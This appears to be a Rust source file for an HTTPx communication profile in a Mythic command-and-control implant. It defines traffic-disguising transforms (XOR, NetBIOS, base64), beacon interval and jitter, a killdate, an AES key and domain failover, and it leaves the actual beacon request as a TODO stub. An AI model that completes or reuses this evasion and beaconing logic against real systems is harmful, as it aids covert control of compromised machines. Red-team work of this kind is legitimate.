use crate::profiles;
use crate::structs::{MythicMessage, Profile};
use crate::utils;
use base64::{engine::general_purpose::STANDARD as BASE64, Engine};
use chrono::NaiveDate;
use std::collections::HashMap;
use std::sync::atomic::{AtomicBool, AtomicI32, Ordering};
use std::sync::RwLock;
use tokio::sync::mpsc;
use tokio::time::Duration;

// ============================================================================
// Transform functions for HTTPx message encoding/decoding
// ============================================================================

#[derive(Debug, Clone, serde::Deserialize)]
pub struct Transform {
    pub function: String,
    pub value: Option<String>,
}

fn apply_transform(data: &[u8], transform: &Transform) -> Vec<u8> {
    match transform.function.as_str() {
        "base64" => BASE64.encode(data).into_bytes(),
        "base64url" => {
            use base64::engine::general_purpose::URL_SAFE_NO_PAD;
            URL_SAFE_NO_PAD.encode(data).into_bytes()
        }
        "prepend" => {
            let mut result = transform
                .value
                .as_deref()
                .unwrap_or("")
                .as_bytes()
                .to_vec();
            result.extend_from_slice(data);
            result
        }
        "append" => {
            let mut result = data.to_vec();
            result.extend_from_slice(
                transform.value.as_deref().unwrap_or("").as_bytes(),
            );
            result
        }
        "xor" => {
            let key = transform.value.as_deref().unwrap_or("").as_bytes();
            if key.is_empty() {
                return data.to_vec();
            }
            data.iter()
                .enumerate()
                .map(|(i, b)| b ^ key[i % key.len()])
                .collect()
        }
        "netbios" => {
            // NetBIOS encoding: each byte becomes two chars
            data.iter()
                .flat_map(|b| {
                    let high = (b >> 4) + b'a';
                    let low = (b & 0x0f) + b'a';
                    vec![high, low]
                })
                .collect()
        }
        "netbiosu" => {
            // NetBIOS uppercase encoding
            data.iter()
                .flat_map(|b| {
                    let high = (b >> 4) + b'A';
                    let low = (b & 0x0f) + b'A';
                    vec![high, low]
                })
                .collect()
        }
        _ => data.to_vec(),
    }
}

fn reverse_transform(data: &[u8], transform: &Transform) -> Vec<u8> {
    match transform.function.as_str() {
        "base64" => BASE64.decode(data).unwrap_or_default(),
        "base64url" => {
            use base64::engine::general_purpose::URL_SAFE_NO_PAD;
            URL_SAFE_NO_PAD.decode(data).unwrap_or_default()
        }
        "prepend" => {
            let prefix_len = transform.value.as_deref().unwrap_or("").len();
            if data.len() > prefix_len {
                data[prefix_len..].to_vec()
            } else {
                Vec::new()
            }
        }
        "append" => {
            let suffix_len = transform.value.as_deref().unwrap_or("").len();
            if data.len() > suffix_len {
                data[..data.len() - suffix_len].to_vec()
            } else {
                Vec::new()
            }
        }
        "xor" => apply_transform(data, transform), // XOR is its own inverse
        "netbios" | "netbiosu" => {
            let base = if transform.function == "netbios" {
                b'a'
            } else {
                b'A'
            };
            data.chunks(2)
                .map(|pair| {
                    if pair.len() == 2 {
                        ((pair[0] - base) << 4) | (pair[1] - base)
                    } else {
                        0
                    }
                })
                .collect()
        }
        _ => data.to_vec(),
    }
}

// ============================================================================
// HTTPx Profile Configuration
// ============================================================================

#[derive(Debug, Clone, serde::Deserialize)]
pub struct HttpxInitialConfig {
    #[serde(rename = "callback_interval")]
    pub interval: i32,
    #[serde(rename = "callback_jitter")]
    pub jitter: i32,
    pub killdate: String,
    #[serde(rename = "encrypted_exchange_check")]
    pub encrypted_exchange_check: bool,
    #[serde(rename = "AESPSK")]
    pub aes_psk: String,
    #[serde(default)]
    pub domains: Vec<HttpxDomainConfig>,
    #[serde(default)]
    pub failover_threshold: i32,
}

#[derive(Debug, Clone, serde::Deserialize)]
pub struct HttpxDomainConfig {
    pub domain: String,
    #[serde(default)]
    pub headers: HashMap<String, String>,
    #[serde(default)]
    pub get_uri: String,
    #[serde(default)]
    pub post_uri: String,
    #[serde(default)]
    pub query_params: Vec<QueryParam>,
    #[serde(default)]
    pub cookies: Vec<CookieConfig>,
    #[serde(default)]
    pub body_transforms: Vec<Transform>,
}

#[derive(Debug, Clone, serde::Deserialize)]
pub struct QueryParam {
    pub name: String,
    pub value: String,
    #[serde(default)]
    pub transforms: Vec<Transform>,
}

#[derive(Debug, Clone, serde::Deserialize)]
pub struct CookieConfig {
    pub name: String,
    pub value: String,
    #[serde(default)]
    pub transforms: Vec<Transform>,
}

pub struct HttpxProfile {
    interval: AtomicI32,
    jitter: AtomicI32,
    killdate: RwLock<NaiveDate>,
    encrypted_exchange_check: RwLock<bool>,
    aes_key: RwLock<Option<Vec<u8>>>,
    uuid: RwLock<String>,
    domains: RwLock<Vec<HttpxDomainConfig>>,
    failover_threshold: AtomicI32,
    current_domain_index: std::sync::atomic::AtomicUsize,
    domain_failure_counts: RwLock<Vec<i32>>,
    running: AtomicBool,
    should_stop: AtomicBool,
}

impl HttpxProfile {
    pub fn new(config: HttpxInitialConfig) -> Self {
        let aes_key = if !config.aes_psk.is_empty() {
            BASE64.decode(&config.aes_psk).ok()
        } else {
            None
        };

        let killdate = NaiveDate::parse_from_str(&config.killdate, "%Y-%m-%d")
            .unwrap_or_else(|_| NaiveDate::from_ymd_opt(2099, 12, 31).unwrap());

        let domain_count = config.domains.len();

        Self {
            interval: AtomicI32::new(config.interval),
            jitter: AtomicI32::new(config.jitter),
            killdate: RwLock::new(killdate),
            encrypted_exchange_check: RwLock::new(config.encrypted_exchange_check),
            aes_key: RwLock::new(aes_key),
            uuid: RwLock::new(profiles::get_uuid()),
            domains: RwLock::new(config.domains),
            failover_threshold: AtomicI32::new(config.failover_threshold.max(5)),
            current_domain_index: std::sync::atomic::AtomicUsize::new(0),
            domain_failure_counts: RwLock::new(vec![0; domain_count]),
            running: AtomicBool::new(false),
            should_stop: AtomicBool::new(false),
        }
    }

    fn past_killdate(&self) -> bool {
        let killdate = self.killdate.read().unwrap();
        chrono::Local::now().date_naive() > *killdate
    }
}

#[async_trait::async_trait]
impl Profile for HttpxProfile {
    fn profile_name(&self) -> &str {
        "httpx"
    }

    fn is_p2p(&self) -> bool {
        false
    }

    async fn start(&self) {
        self.running.store(true, Ordering::Relaxed);
        self.should_stop.store(false, Ordering::Relaxed);

        utils::print_debug("HTTPx: Profile starting");

        while !self.should_stop.load(Ordering::Relaxed) && !self.past_killdate() {
            let sleep_time = self.get_sleep_time();
            if sleep_time > 0 {
                tokio::time::sleep(Duration::from_secs(sleep_time as u64)).await;
            }

            if self.should_stop.load(Ordering::Relaxed) {
                break;
            }

            // TODO: Build request with transforms, send to current domain
            // On failure, increment failure count and potentially rotate domains
        }

        self.running.store(false, Ordering::Relaxed);
    }

    fn stop(&self) {
        self.should_stop.store(true, Ordering::Relaxed);
    }

    fn set_sleep_interval(&self, interval: i32) -> String {
        self.interval.store(interval, Ordering::Relaxed);
        format!("Updated interval to {}\n", interval)
    }

    fn get_sleep_interval(&self) -> i32 {
        self.interval.load(Ordering::Relaxed)
    }

    fn set_sleep_jitter(&self, jitter: i32) -> String {
        let j = jitter.clamp(0, 100);
        self.jitter.store(j, Ordering::Relaxed);
        format!("Updated jitter to {}%\n", j)
    }

    fn get_sleep_jitter(&self) -> i32 {
        self.jitter.load(Ordering::Relaxed)
    }

    fn get_sleep_time(&self) -> i32 {
        let interval = self.interval.load(Ordering::Relaxed);
        let jitter = self.jitter.load(Ordering::Relaxed);
        if jitter == 0 || interval == 0 {
            return interval;
        }
        let jitter_range = (interval as f64 * jitter as f64 / 100.0) as i32;
        let variation = utils::random_num_in_range(-jitter_range, jitter_range + 1);
        (interval + variation).max(0)
    }

    async fn sleep(&self) {
        let sleep_time = self.get_sleep_time();
        if sleep_time > 0 {
            tokio::time::sleep(Duration::from_secs(sleep_time as u64)).await;
        }
    }

    fn get_kill_date(&self) -> NaiveDate {
        *self.killdate.read().unwrap()
    }

    fn set_encryption_key(&self, new_key: &str) {
        if let Ok(key) = BASE64.decode(new_key) {
            let mut aes_key = self.aes_key.write().unwrap();
            *aes_key = Some(key);
        }
    }

    fn get_config(&self) -> String {
        let domains = self.domains.read().unwrap();
        let interval = self.interval.load(Ordering::Relaxed);
        let domain_list: Vec<&str> = domains.iter().map(|d| d.domain.as_str()).collect();
        format!(
            "  Domains: {:?}\n  Interval: {}s\n",
            domain_list, interval
        )
    }

    fn update_config(&self, parameter: &str, value: &str) {
        match parameter {
            "callback_interval" => {
                if let Ok(i) = value.parse::<i32>() {
                    self.interval.store(i, Ordering::Relaxed);
                }
            }
            _ => utils::print_debug(&format!("Unknown HTTPx config: {}", parameter)),
        }
    }

    fn get_push_channel(&self) -> Option<mpsc::Sender<MythicMessage>> {
        None
    }

    fn is_running(&self) -> bool {
        self.running.load(Ordering::Relaxed)
    }
}
